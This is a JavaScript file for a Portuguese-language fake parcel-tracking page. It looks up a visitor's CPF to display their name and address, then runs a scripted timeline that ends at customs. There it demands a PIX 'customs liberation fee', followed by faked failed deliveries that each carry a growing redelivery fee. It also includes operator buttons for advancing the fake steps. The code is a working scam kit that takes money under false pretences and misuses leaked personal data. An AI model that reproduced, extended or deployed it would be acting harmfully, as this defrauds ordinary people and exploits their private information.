class EnhancedTrackingSystem {
    constructor() {
        this.currentStep = 0;
        this.maxSteps = 11;
        this.isPostPaymentFlow = false;
        this.deliveryAttempts = 0;
        this.maxDeliveryAttempts = 3;
        this.postPaymentSteps = [
            { text: "Pedido liberado na alfândega de importação", delay: 0 },
            { text: "Pedido sairá para entrega", delay: 30000 },
            { text: "Pedido em trânsito", delay: 60000 },
            { text: "Pedido em rota de entrega", delay: 90000 }
        ];
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.handleAutoFocus();
        this.createStepButtons();
    }

    createStepButtons() {
        const container = document.getElementById('stepButtonsContainer');
        if (!container) return;

        const steps = [
            "Pedido Criado",
            "Preparando Envio", 
            "Enviado da China",
            "Centro Triagem",
            "Centro Logístico",
            "Trânsito Internacional",
            "Liberado Exportação",
            "Saiu da Origem",
            "Chegou no Brasil",
            "Centro Distribuição",
            "Alfândega"
        ];

        const specialButtons = [
            { text: "💰 Simular Liberação", action: "simulatePayment", color: "#27ae60" },
            { text: "🚚 1ª Tentativa Entrega", action: "delivery1", color: "#e74c3c" },
            { text: "🚚 2ª Tentativa Entrega", action: "delivery2", color: "#e67e22" },
            { text: "🚚 3ª Tentativa Entrega", action: "delivery3", color: "#8e44ad" }
        ];

        container.innerHTML = `
            <div class="step-buttons-grid">
                ${steps.map((step, index) => `
                    <button class="step-button" data-step="${index + 1}" ${index >= this.currentStep ? '' : 'disabled'}>
                        ${index + 1}. ${step}
                    </button>
                `).join('')}
                ${specialButtons.map(btn => `
                    <button class="step-button special-button" data-action="${btn.action}" style="background-color: ${btn.color}">
                        ${btn.text}
                    </button>
                `).join('')}
            </div>
        `;

        // Add event listeners
        container.querySelectorAll('.step-button').forEach(button => {
            button.addEventListener('click', (e) => {
                const step = e.target.dataset.step;
                const action = e.target.dataset.action;
                
                if (step) {
                    this.goToStep(parseInt(step));
                } else if (action) {
                    this.handleSpecialAction(action);
                }
            });
        });
    }

    updateStepButtons() {
        const buttons = document.querySelectorAll('.step-button[data-step]');
        buttons.forEach((button, index) => {
            if (index < this.currentStep) {
                button.disabled = true;
                button.style.backgroundColor = '#27ae60';
                button.style.color = 'white';
            } else if (index === this.currentStep) {
                button.disabled = false;
                button.style.backgroundColor = '#3498db';
                button.style.color = 'white';
            } else {
                button.disabled = true;
                button.style.backgroundColor = '#95a5a6';
                button.style.color = 'white';
            }
        });
    }

    goToStep(targetStep) {
        if (targetStep <= this.maxSteps && targetStep > this.currentStep) {
            this.currentStep = targetStep;
            this.updateTrackingDisplay();
            this.updateStepButtons();
            
            if (targetStep === this.maxSteps) {
                this.showLiberationButton();
            }
        }
    }

    handleSpecialAction(action) {
        switch(action) {
            case 'simulatePayment':
                this.simulatePaymentSuccess();
                break;
            case 'delivery1':
                this.addDeliveryAttemptStep(1);
                break;
            case 'delivery2':
                this.addDeliveryAttemptStep(2);
                break;
            case 'delivery3':
                this.addDeliveryAttemptStep(3);
                break;
        }
    }

    setupEventListeners() {
        const form = document.getElementById('trackingForm');
        if (form) {
            form.addEventListener('submit', this.handleTrackingSubmit.bind(this));
        }

        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('liberation-button')) {
                this.handleLiberationClick();
            }
            
            if (e.target.classList.contains('delivery-retry-btn')) {
                const attempt = parseInt(e.target.dataset.attempt);
                this.handleDeliveryRetry(attempt);
            }

            if (e.target.classList.contains('copy-pix-btn')) {
                this.copyPixCode(e.target);
            }

            if (e.target.id === 'simulatePaymentBtn') {
                this.simulatePaymentSuccess();
            }
        });
    }

    async handleTrackingSubmit(e) {
        e.preventDefault();
        
        const cpfInput = document.getElementById('cpfInput');
        const cpf = cpfInput.value.replace(/\D/g, '');
        
        if (cpf.length !== 11) {
            alert('Por favor, insira um CPF válido com 11 dígitos.');
            return;
        }

        this.showLoading();
        
        try {
            const dataService = new DataService();
            const data = await dataService.fetchCPFData(cpf);
            
            if (data && data.nome) {
                this.displayTrackingInfo(data);
                this.currentStep = 1;
                this.updateTrackingDisplay();
                this.updateStepButtons();
            } else {
                throw new Error('Dados não encontrados');
            }
        } catch (error) {
            console.error('Erro ao buscar dados:', error);
            this.showError('Erro ao consultar CPF. Tente novamente.');
        } finally {
            this.hideLoading();
        }
    }

    displayTrackingInfo(data) {
        this.updateElement('userName', data.nome);
        this.updateElement('userCPF', this.formatCPF(data.cpf));
        this.updateElement('userAddress', `${data.logradouro}, ${data.numero} - ${data.bairro}, ${data.cidade}/${data.uf}`);
        this.updateElement('userCEP', this.formatCEP(data.cep));
        
        this.showElement('trackingResult');
        this.showElement('stepButtonsContainer');
        
        document.getElementById('trackingResult').scrollIntoView({ 
            behavior: 'smooth', 
            block: 'start' 
        });
    }

    updateTrackingDisplay() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const steps = [
            { text: "Pedido criado e confirmado", date: "10 de jul", time: "14:32" },
            { text: "Preparando para envio", date: "10 de jul", time: "16:45" },
            { text: "Enviado da China", date: "11 de jul", time: "08:20" },
            { text: "Chegou no centro de triagem", date: "11 de jul", time: "12:15" },
            { text: "Saiu do centro logístico", date: "11 de jul", time: "18:30" },
            { text: "Em trânsito internacional", date: "12 de jul", time: "02:10" },
            { text: "Liberado para exportação", date: "12 de jul", time: "09:45" },
            { text: "Saiu do país de origem", date: "12 de jul", time: "14:20" },
            { text: "Chegou no Brasil", date: "12 de jul", time: "22:30" },
            { text: "Chegou no centro de distribuição", date: "13 de jul", time: "06:15" },
            { text: "Pedido chegou na alfândega de importação: CURITIBA/PR", date: "12 de jul", time: "01:04" }
        ];

        timeline.innerHTML = '';
        
        for (let i = 0; i < Math.min(this.currentStep, steps.length); i++) {
            const step = steps[i];
            const timelineItem = document.createElement('div');
            timelineItem.className = 'timeline-item completed';
            
            timelineItem.innerHTML = `
                <div class="timeline-dot"></div>
                <div class="timeline-content">
                    <div class="timeline-date">
                        <span class="date">${step.date}</span>
                        <span class="time">${step.time}</span>
                    </div>
                    <div class="timeline-text">
                        <p>${step.text}</p>
                    </div>
                </div>
            `;
            
            timeline.appendChild(timelineItem);
        }
    }

    showLiberationButton() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const lastItem = timeline.lastElementChild;
        if (lastItem && !lastItem.querySelector('.liberation-button')) {
            const liberationButton = document.createElement('button');
            liberationButton.className = 'liberation-button';
            liberationButton.innerHTML = '<i class="fas fa-unlock"></i> LIBERAR OBJETO';
            
            const timelineText = lastItem.querySelector('.timeline-text');
            if (timelineText) {
                timelineText.appendChild(liberationButton);
            }
        }
    }

    handleLiberationClick() {
        const modal = document.getElementById('pixModal');
        if (modal) {
            modal.style.display = 'block';
            this.generatePixPayment();
        }
    }

    async generatePixPayment() {
        try {
            const zentraPayService = new ZentraPayService();
            const pixData = await zentraPayService.generatePix({
                amount: 26.34,
                description: 'Taxa de liberação alfandegária'
            });

            if (pixData && pixData.qr_code) {
                document.getElementById('pixCode').textContent = pixData.qr_code;
                document.getElementById('pixAmount').textContent = 'R$ 26,34';
                
                const qrCodeContainer = document.getElementById('qrCodeContainer');
                if (qrCodeContainer && window.QRCode) {
                    qrCodeContainer.innerHTML = '';
                    new QRCode(qrCodeContainer, {
                        text: pixData.qr_code,
                        width: 200,
                        height: 200
                    });
                }
            }
        } catch (error) {
            console.error('Erro ao gerar PIX:', error);
            document.getElementById('pixCode').textContent = 'Erro ao gerar código PIX';
        }
    }

    simulatePaymentSuccess() {
        const modal = document.getElementById('pixModal');
        if (modal) {
            modal.style.display = 'none';
        }

        this.showPaymentSuccess();
        this.startPostPaymentFlow();
    }

    showPaymentSuccess() {
        const successDiv = document.createElement('div');
        successDiv.className = 'payment-success-notification';
        successDiv.innerHTML = `
            <div class="success-content">
                <i class="fas fa-check-circle"></i>
                <h3>Pagamento Confirmado!</h3>
                <p>Taxa alfandegária paga com sucesso</p>
            </div>
        `;
        
        document.body.appendChild(successDiv);
        
        setTimeout(() => {
            successDiv.remove();
        }, 3000);
    }

    startPostPaymentFlow() {
        this.isPostPaymentFlow = true;
        let stepIndex = 0;

        const processNextStep = () => {
            if (stepIndex < this.postPaymentSteps.length) {
                const step = this.postPaymentSteps[stepIndex];
                this.addTrackingStep(step.text);
                stepIndex++;
                
                if (stepIndex < this.postPaymentSteps.length) {
                    setTimeout(processNextStep, step.delay);
                } else {
                    setTimeout(() => {
                        this.addDeliveryAttemptStep(1);
                    }, 30000);
                }
            }
        };

        processNextStep();
    }

    addTrackingStep(text) {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const stepDate = new Date();
        const timelineItem = document.createElement('div');
        timelineItem.className = 'timeline-item completed';
        timelineItem.style.opacity = '0';
        timelineItem.style.transform = 'translateY(20px)';
        timelineItem.style.transition = 'all 0.5s ease';

        const dateStr = stepDate.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = stepDate.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        timelineItem.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${text}</p>
                </div>
            </div>
        `;

        timeline.appendChild(timelineItem);

        setTimeout(() => {
            timelineItem.style.opacity = '1';
            timelineItem.style.transform = 'translateY(0)';
        }, 100);

        timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    copyPixCode(button) {
        const pixCode = document.getElementById('pixCode').textContent;
        
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(pixCode).then(() => {
                this.showCopySuccess(button);
            }).catch(() => {
                this.fallbackCopyTextToClipboard(pixCode, button);
            });
        } else {
            this.fallbackCopyTextToClipboard(pixCode, button);
        }
    }

    fallbackCopyTextToClipboard(text, button) {
        const textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.top = "0";
        textArea.style.left = "0";
        textArea.style.position = "fixed";

        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();

        try {
            document.execCommand('copy');
            this.showCopySuccess(button);
        } catch (err) {
            console.error('Fallback: Oops, unable to copy', err);
        }

        document.body.removeChild(textArea);
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    updateElement(id, text) {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = text;
        }
    }

    showElement(id) {
        const element = document.getElementById(id);
        if (element) {
            element.style.display = 'block';
        }
    }

    handleAutoFocus() {
        const cpfInput = document.getElementById('cpfInput');
        if (cpfInput) {
            cpfInput.focus();
        }
    }

    addDeliveryAttemptStep(attemptNumber) {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const stepDate = new Date();
        const values = [7.74, 12.38, 16.46];
        const value = values[attemptNumber - 1];

        const timelineItem = document.createElement('div');
        timelineItem.className = 'timeline-item completed';
        timelineItem.style.opacity = '0';
        timelineItem.style.transform = 'translateY(20px)';
        timelineItem.style.transition = 'all 0.5s ease';

        const dateStr = stepDate.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = stepDate.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        timelineItem.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${attemptNumber}ª tentativa de entrega realizada, mas não foi possível entregar</p>
                    <button class="liberation-button-timeline delivery-retry-btn" data-attempt="${attemptNumber - 1}">
                        <i class="fas fa-redo"></i> Reenviar Pacote - R$ ${value.toFixed(2)}
                    </button>
                </div>
            </div>
        `;

        timeline.appendChild(timelineItem);

        setTimeout(() => {
            timelineItem.style.opacity = '1';
            timelineItem.style.transform = 'translateY(0)';
        }, 100);

        timelineItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return true;
    }

    async handleDeliveryRetry(attemptIndex) {
        const values = [7.74, 12.38, 16.46];
        const amount = values[attemptIndex];
        
        try {
            const zentraPayService = new ZentraPayService();
            const pixData = await zentraPayService.generatePix({
                amount: amount,
                description: `Taxa de reenvio - ${attemptIndex + 1}ª tentativa`
            });

            this.showDeliveryPixModal(pixData, amount);
        } catch (error) {
            console.error('Erro ao gerar PIX de reenvio:', error);
        }
    }

    showDeliveryPixModal(pixData, amount) {
        const modal = document.getElementById('pixModal');
        if (modal) {
            document.getElementById('pixAmount').textContent = `R$ ${amount.toFixed(2)}`;
            document.getElementById('pixCode').textContent = pixData.qr_code || 'Código PIX gerado';
            
            const qrCodeContainer = document.getElementById('qrCodeContainer');
            if (qrCodeContainer && window.QRCode) {
                qrCodeContainer.innerHTML = '';
                new QRCode(qrCodeContainer, {
                    text: pixData.qr_code || 'PIX_CODE_PLACEHOLDER',
                    width: 200,
                    height: 200
                });
            }
            
            modal.style.display = 'block';
        }
    }

    showLoading() {
        const button = document.querySelector('#trackingForm button[type="submit"]');
        if (button) {
            button.disabled = true;
            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
        }
    }

    hideLoading() {
        const button = document.querySelector('#trackingForm button[type="submit"]');
        if (button) {
            button.disabled = false;
            button.innerHTML = '<i class="fas fa-search"></i> Rastrear Pedido';
        }
    }

    showError(message) {
        alert(message);
    }

    formatCPF(cpf) {
        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }

    formatCEP(cep) {
        return cep.replace(/(\d{5})(\d{3})/, '$1-$2');
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.trackingSystem = new EnhancedTrackingSystem();
});